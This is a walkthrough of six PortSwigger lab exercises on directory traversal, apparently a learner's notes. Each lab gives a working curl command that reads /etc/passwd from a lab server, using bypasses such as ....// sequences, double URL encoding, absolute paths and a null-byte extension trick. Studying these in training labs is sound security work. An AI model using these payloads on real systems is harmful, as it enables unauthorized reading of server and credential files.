
## Directory Traversal Lab

### LAB #1: File path traversal, simple case

Lab URl: https://portswigger.net/web-security/file-path-traversal/lab-simple

Objective: view the content of `/etc/passwd`

This lab contains a shopping application that has different products. Each product has its image and they are getting that image from an image API using a parameter name `filename`. The full URL of the image API is like the following.

```
https://0a30000b0355a606c1d7941d00800012.web-security-academy.net/image?filename=65.jpg
```

This didn't enforce any protection against directory traversal so attackers can use directory traversal to view server internal files. Using the following command we can get the content of the `/etc/passwd` file.

```bash
curl https://0a30000b0355a606c1d7941d00800012.web-security-academy.net/image?filename=../../../../etc/passwd
```

As the API is used for giving an image file so the browser will not show the content in the browser they will show the following error.

```
The image "https://0a30000b0355a606c1d7941d00800012.web-security-academy.net/image?filename=../../../../etc/passwd" cannot be displayed because it contains errors.
```

So we must use tools like curl that will show us raw responses.


### LAB #2: File path traversal, traversal sequences blocked with absolute path bypass

Lab URL: https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass

Objective: view the content of `/etc/passwd`

This lab contains a shopping application that has different products. Each product has its image and they are getting that image from an image API using a parameter name `filename`. The full URL of the image API is like the following.

```
https://0a2100ff03287847c5707ebf004200f8.web-security-academy.net/image?filename=25.jpg
```

They enforce some protection that will strip any combination of `../` and they are striping that in the loop so we cannot use payload like this `....//....//` this will also block any URL encoding also doesn't work. But by using an absolute path they will give us the content of the `/etc/passwd` file.

```bash
curl https://0a2100ff03287847c5707ebf004200f8.web-security-academy.net/image?filename=/etc/passwd
```

### LAB #3: File path traversal, traversal sequences stripped non-recursively

Lab URL: https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively

Objective: view the content of `/etc/passwd`

This lab contains a shopping application that has different products. Each product has its image and they are getting that image from an image API using a parameter name `filename`. The full URL of the image API is like the following.

```
https://0a2100ff03287847c5707ebf004200f8.web-security-academy.net/image?filename=25.jpg
```

They enforce some protection that will strip any combination of `../` but they didn't do striping in loop or recursively so we can use payload like this `....//....//` and that will bypass the protection and give us the contents of `/etc/passwd` file.

```bash
curl https://0ac400c9034b1ecac1a9a98400c5000e.web-security-academy.net/image?filename=....//....//....//....//....//etc/passwd
```

### LAB #4: File path traversal, traversal sequences stripped with superfluous URL-decode

Lab URL: https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode

Objective: view the content of `/etc/passwd`

This lab contains a shopping application that has different products. Each product has its image and they are getting that image from an image API using a parameter name `filename`. The full URL of the image API is like the following.

```
https://0a68000304308ecac0dcf95800c800af.web-security-academy.net/image?filename=5.jpg
```

They enforce some protection against directory traversal attacks in which they block any sequences of `../` and we can also don't get the files using an absolute path. Using a double URL to encode the directory traversal payload we can get the context of the `/etc/passwd` file.

```bash
curl https://0a68000304308ecac0dcf95800c800af.web-security-academy.net/image?filename=..%252f..%252f..%252fetc/passwd
```

### LAB #5: File path traversal, validation of start of the path

Lab URL: https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path

Objective: view the content of `/etc/passwd`

This lab contains a shopping application that has different products. Each product has its image and they are getting that image from an image API using a parameter name `filename`. The full URL of the image API is like the following.

```
https://0a11006b04fb4ccfc0c6402100f8006c.web-security-academy.net/image?filename=/var/www/images/13.jpg
```

In the above URL, we can see the filename parameter start with the directory `/var/www/image` if we didn't pass that path in our URL they show us an error saying

```
Missing parameter 'filename'
```

They are validating if the URL has that path or not if not then throw an error. This validation can easily be bypassed using a payload like the following.

```
/var/www/images/../../../etc/passwd
```

we can get the contents of `/etc/passwd` using the following command.

```bash
curl https://0a11006b04fb4ccfc0c6402100f8006c.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
```

### LAB #6: File path traversal, validation of file extension with null byte bypass

Lab URL: https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

Objective: view the content of `/etc/passwd`

This lab contains a shopping application that has different products. Each product has its image and they are getting that image from an image API using a parameter name `filename`. The full URL of the image API is like the following.

```
https://0a1400e80330a27ec02ddb9b00b10089.web-security-academy.net/image?filename=30.jpg
```

They add some extension validation in it. If the file doesn't have an extension `.jpg` they will not show any result and throw an error.

```
No such file
```

Any payload other payload didn't work but we can bypass this validation using a Null byte in our payload like the following.

```
../../../../../etc/passwd%00.jpg
```

Using this payload we can get the content of `/etc/passwd` using the following command.

```bash
curl https://0a1400e80330a27ec02ddb9b00b10089.web-security-academy.net/image?filename=../../../../etc/passwd%00.jpg
```

---
